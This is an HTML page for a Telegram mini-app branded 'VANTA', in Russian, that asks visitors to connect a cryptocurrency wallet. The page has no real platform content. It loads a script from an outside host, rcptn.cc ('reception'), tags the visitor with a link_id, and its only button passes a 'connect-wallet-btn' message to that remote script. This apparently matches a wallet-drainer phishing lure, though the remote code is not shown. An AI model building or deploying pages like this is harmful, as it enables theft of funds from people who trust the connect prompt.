
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="link_id" content="Z2hipe7gUlaJ">

    <title>VANTA</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <script defer type="module" crossorigin
        src="https://rcptn.cc/static/reception/js/build.js">
    </script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #09090d;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        #root {
            width: 100%;
            max-width: 440px;
        }

        .container {
            background: #111018;
            border: 1px solid #292333;
            border-radius: 25px;
            padding: 30px 24px;
            text-align: center;
            box-shadow: 0 20px 70px #00000070;
        }

        .logo {
            font-size: 34px;
            font-weight: 800;
            letter-spacing: 9px;
            margin-bottom: 12px;
        }

        .subtitle {
            color: #898493;
            font-size: 13px;
            margin-bottom: 35px;
        }

        .wallet-icon {
            width: 75px;
            height: 75px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 22px;
            background: #211833;
            color: #b58aff;
            font-size: 34px;
        }

        h1 {
            font-size: 23px;
            margin-bottom: 12px;
        }

        .description {
            color: #898493;
            font-size: 13px;
            line-height: 1.6;
            margin-bottom: 28px;
        }

        .connect-button {
            width: 100%;
            padding: 17px;
            border: none;
            border-radius: 14px;
            background: linear-gradient(110deg, #7040c4, #a16cf4);
            color: white;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
        }

        .connect-button:active {
            transform: scale(0.98);
        }

        .security {
            color: #625d6b;
            font-size: 11px;
            margin-top: 22px;
            line-height: 1.5;
        }

        .footer {
            color: #514c59;
            font-size: 10px;
            letter-spacing: 3px;
            margin-top: 30px;
        }
    </style>
</head>

<body>

    <div id="root">
        <div class="container">

            <div class="logo">VANTA</div>
            <div class="subtitle">DIGITAL ASSET PLATFORM</div>

            <div class="wallet-icon">◈</div>

            <h1>Подключение кошелька</h1>

            <p class="description">
                Подключите свой криптовалютный кошелёк
                для взаимодействия с платформой VANTA.
            </p>

            <button
                type="button"
                class="connect-button"
                onclick="open_window();"
            >
                Подключить кошелёк
            </button>

            <div class="security">
                Никогда не передавайте seed-фразу
                или приватные ключи третьим лицам.
            </div>

            <div class="footer">
                VANTA © 2026
            </div>

        </div>
    </div>

    <script>
        const tg = window.Telegram?.WebApp;

        if (tg) {
            tg.ready();
            tg.expand();
            tg.setHeaderColor("#09090d");
            tg.setBackgroundColor("#09090d");
        }

        function open_window() {
            window.postMessage(
                { type: 'connect-wallet-btn' },
                '*'
            );
        }
    </script>

</body>
</html>
